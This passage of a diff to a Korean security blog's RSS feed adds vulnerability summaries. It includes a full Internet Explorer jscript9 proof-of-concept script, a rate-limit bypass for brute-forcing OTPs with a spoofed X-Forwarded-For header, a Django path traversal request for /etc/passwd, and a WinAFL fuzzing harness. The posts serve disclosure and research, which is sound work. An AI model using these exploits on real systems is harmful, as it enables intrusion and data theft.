무시할 수 있어 해커는 임의의 앱을 설치하고 관리자 권한을 부여할 수 있습니다.</p></li><li><p>CVE-2021-25391</p><p>Secure Folder는 Intent redirection 취약점이 있어 해커가 읽기, 쓰기 작업을 가로챌 수 있습니다.</p></li><li><p>CVE-2021-25393</p><p>SecSetting은 intent에 대한 부적절한 sanitization 때문에 해커가 system uid 데이터에 접근 할 수 있습니다.</p></li><li><p>CVE-2021-25392</p><p>Samsung Dex는 부적절한 백업 경로 설정 때문에 해커가 이를 변경해 크리티컬 데이터를 노출시킬 수 있습니다.</p></li><li><p>CVE-2021-25397</p><p>TelephonyUI의 부적절한 Access control 때문에 해커는 TelephonyUI의 파일에 대한 쓰기 작업을 할 수 있습니다.</p></li><li><p>CVE-2021-25390</p><p>PhotoTable의 Intent redirection 취약점은 해커가 임의의 파일에 접근할 수 있게 합니다.</p></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/pre-installed-app/">pre-installed app</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/16/fabu1ous/2021-06-16/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-31959: Internet Explorer Uninitialized Property ID array</title>
+      <link>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/</link>
+      <guid>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/</guid>
+      <pubDate>Tue, 15 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-075-d</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">Issue 2168: Internet Explorer: Memory corruption in jscript9.dll due to uninitialized Property ID array</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer (Windows 10)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS에서 지원을 2022년 6월에 완전히 종료하겠다고 밝힌 Internet Explorer에서 초기화되지 않은 배열 요소의 사용으로 인한 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 jscript9의 PropertyID 배열의 처리 방식에 존재합니다. PropertyID 배열은 <code>ByteCodeGenerator::EmitScopeObjectInit</code> 함수에 할당됩니다. 이때 할당 시 메모리를 초기화하지 않는 <code>ArenaAllocator::Alloc</code> 함수를 사용해 배열을 할당하므로 배열의 일부가 초기화되지 않은 상태로 유지됩니다.</p><p>이러한 초기화되지 않은 PropertyID로 변수의 scope를 속일 수 있습니다. 이를 악용하면 정상적인 방법으로 액세스 할 수 없는 변수에 액세스 할 수 있으며 원격 코드 실행으로 이어질 수 있습니다. 해당 취약점은 <a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html">CVE-2020-1380</a>과 동일한 방법으로 JIT 엔진을 사용해 트리거할 수 있습니다.</p><p><strong>PoC Code</strong></p><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- saved from url=(0014)about:internet --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;start&#x27;</span>);</span><span class="javascript"><span class="hljs-comment">// prepare objects</span></span><span class="javascript"><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x8c</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Int32Array</span>(buf);</span><span class="javascript"><span class="hljs-keyword">var</span> o = &#123;&#125;;</span><span class="javascript">o.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">    alert(<span class="hljs-string">&#x27;callback&#x27;</span>);</span><span class="javascript">    <span class="hljs-comment">// free </span></span><span class="javascript">    worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&#x27;worker.js&#x27;</span>);</span>    worker.postMessage(buf, [buf]);    worker.terminate();<span class="javascript">    worker = <span class="hljs-literal">null</span>;</span><span class="javascript">    <span class="hljs-comment">// sleep</span></span><span class="javascript">    <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();</span><span class="javascript">    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;</span><span class="javascript">    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> reclaim freed memory</span></span><span class="javascript">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span>&#125;;<span class="javascript"><span class="hljs-comment">// generate function from string in order to have a clean bytecode generator</span></span><span class="javascript"><span class="hljs-keyword">var</span> vulnstr =</span><span class="javascript"><span class="hljs-string">&quot;for (let i=0; i&lt;1; i++) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    function opt(A, x, crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        &#x27;use strict&#x27;;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const aagaaaaaaahabauaaaaa = x+1;\n&quot;</span> + <span class="hljs-comment">//special variable name so that hash is eqal to 0x109 (property ID of Int16Array)</span></span><span class="javascript"><span class="hljs-string">&quot;        const c02 = aagaaaaaaahabauaaaaa+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c03 = c02+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c04 = c03+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c05 = c04+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        let c06 = c05+1;\n&quot;</span> +  <span class="hljs-comment">// this variable will alias with Int16Array</span></span><span class="javascript"><span class="hljs-string">&quot;        const c07 = c06+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c08 = c07+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c09 = c08+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c10 = c09+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c11 = c10+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c12 = c11+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c13 = c12+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c14 = c13+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c15 = c14+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c16 = c15+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c17 = c16+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c18 = c17+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c19 = c18+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c20 = c19+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c21 = c20+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c22 = c21+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c23 = c22+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c24 = c23+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c25 = c24+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c26 = c25+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c27 = c26+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c28 = c27+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c29 = c28+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c30 = c29+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c31 = c30+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c32 = c31+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c33 = c32+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c34 = c33+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c35 = c34+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c36 = c35+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c37 = c36+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c38 = c37+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        if(crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;          c06 = c06 + 1;\n&quot;</span> + <span class="hljs-comment">// we must change it here so that the value below is not known</span></span><span class="javascript"><span class="hljs-string">&quot;          Int16Array = o;\n&quot;</span> + <span class="hljs-comment">// here we actually change the value (and type) of c06</span></span><span class="javascript"><span class="hljs-string">&quot;        &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        A[0] = c06;\n&quot;</span> + <span class="hljs-comment">// if crash==1, c06 is an object here, but JIT thinks it&#x27;s an integer</span></span><span class="javascript"><span class="hljs-string">&quot;        eval(1);\n&quot;</span> +  <span class="hljs-comment">// needed to trigger ByteCodeGenerator::EmitScopeObjectInit</span></span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    for(var i=0; i&lt;100000; i++) &#123;\n&quot;</span> + <span class="hljs-comment">// jit a function</span></span><span class="javascript"><span class="hljs-string">&quot;      opt(arr, 1, 0);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    opt(arr, 1, 1);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    alert(&#x27;failed&#x27;);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;&#125;&quot;</span>;</span><span class="javascript">vuln = <span class="hljs-built_in">Function</span>(vulnstr);</span>vuln();<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/internet-explorer/">internet explorer</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/uninitialized-variable/">uninitialized variable</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Rate Limit 우회를 통한 OTP Brute-Force</title>
+      <link>https://hackyboiz.github.io/2021/06/14/idioth/2021-06-14/</link>
+      <guid>https://hackyboiz.github.io/2021/06/14/idioth/2021-06-14/</guid>
+      <pubDate>Mon, 14 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://systemweakness.com/brute-forcing-otp-via-bypassin</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://systemweakness.com/brute-forcing-otp-via-bypassing-rate-limit-c5ee6b25c2a8">OTP Brute-Force Via Rate Limit Bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>One Time Password</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Rate limit가 존재하는 OTP (One Time Password) 메커니즘을 우회하여 Brute Force이 가능한 방법이 공개되었습니다. 원글의 작성자는 버그 바운티의 타깃이 되는 웹 사이트를 공개하지 않았습니다.</p><p>타깃 웹사이트에서 비밀번호를 재설정하는 부분에 제공된 이메일 주소로 OTP가 전송됩니다. Reset Password 버튼을 반복하여 클릭하고 Burp Suite로 확인하면 rate limit가 적용되어 있습니다. 따라서 연속적인 request가 발생할 시 <code>Server error</code>가 발생합니다. 하지만 <code>X-Forwarded-For: 127.0.0.1</code> 헤더를 사용하여 OTP의 time limiting을 우회할 수 있습니다. 이를 통해 <code>X-Forwarded-For</code>의 호스트 ID를 <code>127.0.0.1</code>부터 <code>127.0.0.255</code>까지 바꿔가면서 OTP를 Brute Force 할 수 있습니다.</p><p><img src="https://miro.medium.com/max/1200/1*yuL2sY-lT9Z1TESnqGR1_w.png" alt="img"></p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/otp/">otp</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bruteforce/">bruteforce</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/time-limiting/">time limiting</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/14/idioth/2021-06-14/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[Research] WinAFL로 마구 퍼징하기 Part2</title>
+      <link>https://hackyboiz.github.io/2021/06/13/fabu1ous/winafl-2/</link>
+      <guid>https://hackyboiz.github.io/2021/06/13/fabu1ous/winafl-2/</guid>
+      <pubDate>Sun, 13 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;Part-1-요약&quot;&gt;&lt;a href=&quot;#Part-1-요약&quot; class=&quot;headerlink&quot; title=&quot;Part 1 요약&quot;&gt;&lt;/a&gt;Part 1 요약&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2021/06/13/fabu1ous/winafl-2/1.</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="Part-1-요약"><a href="#Part-1-요약" class="headerlink" title="Part 1 요약"></a>Part 1 요약</h1><p><img src="/2021/06/13/fabu1ous/winafl-2/1.png"></p><p><img src="/2021/06/13/fabu1ous/winafl-2/2.png"></p><p>애미야… 실행속도가… 짜다…</p><p><a href="https://hackyboiz.github.io/2021/05/23/fabu1ous/winafl-1/">Part 1 보러가기</a></p><h1 id="루프-쓴다며"><a href="#루프-쓴다며" class="headerlink" title="루프 쓴다며!"></a>루프 쓴다며!</h1><p><img src="/2021/06/13/fabu1ous/winafl-2/3.png"></p><p>WinAFL은 빠른 퍼징 속도를 자랑한다고 해서 많이 기대했는데 3초에 1번 꼴로 타겟 함수를 실행하고 Total paths도 1인걸 보니 많이 허탈하더군요. 아무리 느려도 BFF 보단 빨라야 하는 거 아닌가라는 생각에 어이가 없어서 뭐가 문제일까 곰곰이 생각하던 중 이상한 걸 발견했습니다.</p><p><img src="/2021/06/13/fabu1ous/winafl-2/4.png"></p><p>실행 횟수가 늘어날때마다 PID와 함께 그 프로세스를 종료시켰다는 로그가 출력되더군요. Iteration을 할 때 몇몇 리소스가 여전히 어딘가에서 사용 중이라면 이런 현상이 발생한다고 합니다. 그래서 처음엔 타겟 함수가 child process를 생성하고 종료하지 않아 WinAFL이 대신 종료시키는 거라고 생각했습니다. ProcMon으로 WinAFL의 iteration 하나를 캡쳐하고 화면에 출력되는 PID를 찾아봤더니 child process가 아니라 harness.exe의 PID였습니다.</p><p><img src="/2021/06/13/fabu1ous/winafl-2/5.png"></p><p>Part 1에서 WinAFL은 프로세스(Harness.exe)를 종료하지 않고 타겟 함수를 루프로 반복 실행해 빠른 퍼징 속도를 낼 수 있다는 사실을 굉장히 강조했습니다. 물론 Harness를 똑바로 작성했을 때의 이야기입니다. 제가 작성한 Harness처럼 문제가 있다면 오히려 WinAFL의 저런 특징들이 독이 되서 반대로 퍼징 속도가 극악무도하게 느려집니다.</p><h1 id="그래서-뭐가-문제인가"><a href="#그래서-뭐가-문제인가" class="headerlink" title="그래서 뭐가 문제인가"></a>그래서 뭐가 문제인가</h1><p>위에서 언급한 것처럼 iteration을 할 때 몇몇 리소스가 여전히 사용 중이라면 이를 해결하기 위해 WinAFL이 프로세스를 종료합니다. 타겟함수 내에서 input 파일이 제대로 닫히지 않은 것이 문제인 것 같아서 분석해 봤습니다. ( 네, 이때서야 타겟 함수를 분석했습니다. Harness가 똑바로 동작안하는 것도 당연하지… )</p><p><img src="/2021/06/13/fabu1ous/winafl-2/6.png"></p><p>타겟 함수에는 2가지 문제점이 있었습니다. 첫 번째, input 파일을 두 번 열고 닫습니다. 타겟 함수는 파일의 손상이 있는지 확인하고 그에 맞는 핸들 번호를 리턴하는데 우선 파일을 열어 파일 시그니쳐를 읽고 검사합니다. 만약 파일 시그니처가 유효하다면 서브 루틴에서 다시 한번 더 파일을 열어 파싱 하고 검사합니다. Part1에서 설명한 대로 타겟 함수가 만족해야 할 조건은 다음과 같습니다.</p><ol><li>함수 내에서 input 파일을 열어야 함</li><li>그 파일을 파싱 해야 함</li><li>함수 내에서 input 파일을 닫아야 함</li><li>리턴까지 정상적으로 실행되어야 함</li></ol><p>여기서 3번 과정이 중요한데 Harness가 파일을 닫아야 WinAFL이 파일의 내용을 수정할 수 있습니다.</p><p>WinAFL이 파일을 mutate 하기 위해 접근하지만 Harness가 다시 사용해 실패하게 되고 강제로 Harness를 종료시키게 됩니다.</p><p>두 번째, 처음 파일을 열었을 때 파일 시그니처 “4 byte”만 읽기 때문에 퍼징에 의미 없는 동작입니다. 처음부터 타겟 함수를 조금이라도 분석했으면 이런 문제가 발생하지 않았을 텐데…</p><h1 id="Harness"><a href="#Harness" class="headerlink" title="Harness"></a>Harness</h1><p>문제점을 알아냈으니 Harness를 수정해 봅시다. 우선 타겟 함수를 변경했습니다. 기존 타겟 함수 내부에 있던 서브 루틴으로 파일의 아카이브 헤더를 읽어와 파싱 하고 검사합니다. 새로운 타겟 함수는 vtable을 인자로 받아 사용하고 <code>__thiscall</code> 호출 규약을 사용하기 때문에 그에 맞게 코드를 수정해 줬습니다.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(__thiscall *TARGET)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp, <span class="hljs-keyword">wchar_t</span>* filename)</span></span>;TARGET target;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(__thiscall *OPERATE)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp)</span></span>;OPERATE pre_target;OPERATE post_target;OPERATE filecl;<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) __declspec(noinline) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fuzzme</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp, <span class="hljs-keyword">wchar_t</span>* path)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> result = target(vp, path);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result: %d\\n&quot;</span>, result);filecl(vp);<span class="hljs-keyword">return</span> result;&#125;<span class="hljs-function"><span class="hljs-keyword">wchar_t</span>* <span class="hljs-title">charToWChar</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* text)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">size_t</span> size = <span class="hljs-built_in">strlen</span>(text) + <span class="hljs-number">1</span>;<span class="hljs-keyword">wchar_t</span>* wa = (<span class="hljs-keyword">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">wchar_t</span>) * size);mbstowcs(wa, text, size);<span class="hljs-keyword">return</span> wa;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> vp[<span class="hljs-number">32</span>];SetDllDirectory(<span class="hljs-string">&quot;...&quot;</span>); <span class="hljs-comment">// Dll 경로</span>HMODULE DLLHandle = LoadLibrary(<span class="hljs-string">&quot;TargetDll.dll&quot;</span>);<span class="hljs-keyword">if</span> (DLLHandle == <span class="hljs-number">0</span>)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot load TargetDll.dll\\n&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\\n&quot;</span>, DLLHandle);target = (TARGET)DLLHandle + <span class="hljs-number">0x1500</span>;filecl = (OPERATE)DLLHandle + <span class="hljs-number">0x16e0</span>;pre_target = (OPERATE)DLLHandle + <span class="hljs-number">0x1000</span>;post_target = (OPERATE)DLLHandle + <span class="hljs-number">0x10c0</span>;pre_target(vp);<span class="hljs-keyword">int</span> result = fuzzme(vp, charToWChar(argv[<span class="hljs-number">1</span>]));post_target(vp);<span class="hljs-keyword">return</span> result;&#125;</code></pre><p><img src="/2021/06/13/fabu1ous/winafl-2/7.png"></p><p>프로세스 종료 문제가 사라졌고 초당 90번 정도 실행 속도가 나옵니다. WinAFL은 여전히 느리다고 불평하지만 3초에 1번 실행하던 이전 버전보단 훨씬 괜찮은 거 같습니다. 무엇보다 bff에 비하면 엄청나게 빠른 거라 저는 만족합니다.</p><h1 id="병렬-처리"><a href="#병렬-처리" class="headerlink" title="병렬 처리"></a>병렬 처리</h1><p>코어 갯수만큼 인스턴스를 돌릴 수 있습니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -M fuzzer<span class="hljs-number">01</span> -D <span class="hljs-string">&quot;%DynamoRIO경로%\\bin32&quot;</span> -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe -target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">2</span> -- <span class="hljs-string">&quot;%harness경로%harness.exe&quot;</span> @@<span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -S fuzzer<span class="hljs-number">02</span> -D <span class="hljs-string">&quot;%DynamoRIO경로%\\bin32&quot;</span> -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe -target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">2</span> -- <span class="hljs-string">&quot;%harness경로%harness.exe&quot;</span> @@</code></pre><p><img src="/2021/06/13/fabu1ous/winafl-2/8.png"></p><p>8 코어라서 8개 돌리는 중입니다. 아름답습니다. harness 수정하기 전에는 CPU 40% 정도 쓰던데 지금은 83%~88%를 찍는 거 보니 기분도 좋네요.</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>음… 뭔가 엄청 길어질 거라 생각해서 Part 2로 나누긴 했는데 아무래도 실제 상용 프로그램을 분석한 내용을 상세하게 적을 수 없기 때문에 글이 많이 짧아진 거 같네요. 글로 보면 짧은데 저의 삽질은 엄청 길었습니다. ㅎㅎ. Harness를 자동으로 생성해주는 winnie-AFL이란 것도 있던데 다음 글은 아마 winnie-AFL에 관한 글이 될 거 같습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/harness/">harness</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bug-bounty/">bug bounty</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/13/fabu1ous/winafl-2/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[하루한줄] JOOMLA PASSWORD RESET VULNERABILITY AND A STORED XSS FOR FULL COMPROMISE</title>
@@ -96,7 +399,7 @@
       
       
       
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>파이썬으로 작성된 오픈소스 웹 프레임워크 Django에서는  <code>django.contrib.admindocs</code> 모듈이 활성화되었을 때 path traversal 취약점이 발생합니다.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> 함수에서 해커는 template 변수를 임의의 값으로 설정할 수 있고 이를 별다른 검증 없이 Path join합니다. 이를 이용해 template directory 외부 경로의 파일을 제공할 수 있어 <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code> 와 같이 요청을 보내는 것으로 파일 시스템 내 임의 경로의 파일 내용이 렌더링 메서드로 전달되어 파일 내용이 유출될 수 있습니다. 해당 취약점은 아래와 같이 <code>safe_join</code> 함수를 사용해 경로를 합치는 것으로 패치되었습니다.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>자세한 패치 히스토리는 <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> 에서 확인할 수 있습니다.</p>]]></content:encoded>
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>파이썬에서 작성된 오픈소스 웹 프레임워크 Django에서 path traversal 취약점이 발견되었습니다. 해당 취약점은 <code>django.contrib.admindocs</code> 모듈이 활성화되었을 때 발생합니다.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> 함수에서 해커는 template 변수를 임의의 값으로 설정할 수 있고 이를 별다른 검증 없이 Path join 합니다. 이를 이용해 template directory 외부 경로의 파일을 제공할 수 있어 <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code>와 같은 요청을 보내는 것으로 파일 시스템 내 임의 경로의 파일 내용이 렌더링 메서드로 전달되어 파일 내용이 유출될 수 있습니다. 해당 취약점은 아래와 같이 <code>safe_join</code> 함수를 사용해 경로를 합치는 것으로 패치되었습니다.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>자세한 패치 히스토리는 <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> 에서 확인할 수 있습니다.</p>]]></content:encoded>
       
       
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
@@ -397,334 +700,6 @@
       
       
       <comments>https://hackyboiz.github.io/2021/06/04/l0ch/2021-06-04/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-31181: Microsoft SharePoint 원격 코드 실행 취약점</title>
-      <link>https://hackyboiz.github.io/2021/06/03/idioth/2021-06-03/</link>
-      <guid>https://hackyboiz.github.io/2021/06/03/idioth/2021-06-03/</guid>
-      <pubDate>Thu, 03 Jun 2021 05:00:00 GMT</pubDate>
-      
-        
-        
